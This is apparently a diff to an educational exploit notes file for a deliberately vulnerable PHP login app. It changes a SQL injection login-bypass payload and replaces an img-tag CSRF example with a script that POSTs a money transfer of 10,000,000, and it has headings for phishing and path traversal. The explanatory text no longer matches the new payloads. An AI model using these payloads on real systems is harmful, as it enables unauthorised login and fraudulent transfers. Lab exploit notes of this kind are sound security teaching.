@@ -8,7 +8,7 @@ present in this application. FOR EDUCATIONAL PURPOSES ONLY.
 ------------------------
 
 a) Login Bypass:
-   - Email: admin" OR "1"="1
+   - Email: ' OR 1=1 -- eng-brk
    - Password: anything
    
    Query becomes: SELECT * FROM users WHERE email='admin" OR "1"="1' AND pass='anything'
@@ -72,10 +72,16 @@ c) Phishing Form:
 a) Hidden Form Method:
    Create an invisible form that automatically submits, transferring money to attacker's account.
 
-b) IMG Tag Method:
-   <img src="http://localhost/login_app/dashboard.php?to_id=2&amount=1000&transfer=true" width="0" height="0">
-   
-   This doesn't work for POST requests but shows the concept for GET-based vulnerabilities.
+b) IMG Tag Method:--eng-brk
+<script>
+fetch("dashboard.php", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: "to_id=7&amount=10000000&transfer=Transfer+Money"
+});
+</script>
 
 
 4. PATH TRAVERSAL EXPLOITATION
